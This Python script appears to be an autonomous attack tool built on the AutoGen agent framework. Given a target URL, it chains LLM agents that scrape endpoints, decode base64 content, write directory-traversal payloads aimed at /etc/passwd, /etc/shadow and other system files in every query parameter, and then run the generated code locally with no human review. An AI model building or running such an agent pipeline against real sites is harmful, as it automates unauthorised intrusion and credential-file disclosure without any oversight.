import argparse
import os

import requests
from autogen import ConversableAgent, register_function
from autogen.coding import LocalCommandLineCodeExecutor
from dotenv import load_dotenv

load_dotenv()


def scraping_tool(url: str):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        return f"Error fetching {url}: {str(e)}"


parser = argparse.ArgumentParser(description="Scrape a URL and perform reconnaissance.")
parser.add_argument("--url", type=str, required=True, help="The URL to scrape and analyze")

args = parser.parse_args()
url = args.url

llm_config_gpt35_turbo = {
    "temperature": 0.1,
    "config_list": [
        {
            "api_type": "openai",
            "model": "gpt-3.5-turbo",
            "api_key": os.getenv('OPENAI_KEY'),
            "cache_seed": None,
        }
    ],
}

recon_agent_sys_msg = """
Your task is to perform reconnaissance on a given target. 
- Identify all available endpoints from the base URL.
- Format the results as a JSON file with empty query parameter values.
- Exclude endpoints without query parameters.
"""

exploit_crafter_agent_sys_msg = """
You are an expert in crafting payloads for directory traversal exploits.
- Use "../../../../../../" to traverse directories, followed by common Linux filenames.
- Target critical files like /etc/passwd, /etc/shadow, /var/log/syslog, /home/user/.bashrc, etc.
- Focus on endpoints with query parameters.
- Return the Python payload only in triple backticks (```).
"""

recon_agent = ConversableAgent(
    name="recon_agent",
    llm_config=False,
    max_consecutive_auto_reply=2,
    human_input_mode="NEVER",
)

base64_agent = ConversableAgent(
    name="base64_agent",
    system_message="Select only the base64 encoded content Dont return anything else except the base64 encoded content.",
    llm_config=llm_config_gpt35_turbo,
    max_consecutive_auto_reply=2,
    human_input_mode="NEVER",
)

summerize_agent = ConversableAgent(
    name="summarizer_agent",
    system_message=recon_agent_sys_msg,
    llm_config=llm_config_gpt35_turbo,
    human_input_mode="NEVER",
)

exploit_crafter_agent = ConversableAgent(
    name="exploit_crafter_agent",
    system_message=exploit_crafter_agent_sys_msg,
    llm_config=llm_config_gpt35_turbo,
    human_input_mode="NEVER",
)

executor_agent = ConversableAgent(
    name="executor_agent",
    system_message="You are responsible for securely executing commands.",
    llm_config=llm_config_gpt35_turbo,
    max_consecutive_auto_reply=5,
    human_input_mode="NEVER",
    default_auto_reply="Execution complete.",
    code_execution_config={
        "executor": LocalCommandLineCodeExecutor(work_dir="coding", timeout=60),
        # Secure the executor environment
    },
)

register_function(
    scraping_tool,
    name="scraping_tool",
    caller=summerize_agent,
    executor=recon_agent,
    description="A tool to scrape a given URL.",
)

# Example Chat Interaction
recon_chat = recon_agent.initiate_chat(
    summerize_agent,
    message=(f"Can you scrape the provided URL and find all endpoints?\nURL: {url}"),
    max_turns=2,
)

scraped_content = recon_chat.chat_history[2]["content"]

# check base64 encoding
base64_payload = base64_agent.initiate_chat(
    recon_agent,
    message=f"Find all the base64 code and Dencode the scraped content using Base64: {scraped_content}",
    max_turns=2,
)

print(base64_payload.chat_history[2]["content"])

craft_payload = executor_agent.initiate_chat(
    exploit_crafter_agent,
    message=(
        f"Based on the scraped file from {scraped_content}, craft Python code to inject directory traversal payloads."
        f" Target URL: {url}.\n"
        "Ensure all query parameters are replaced with payloads."
        " Only target endpoints with query parameters. Replace query values with crafted payloads."),
    max_turns=2,
)
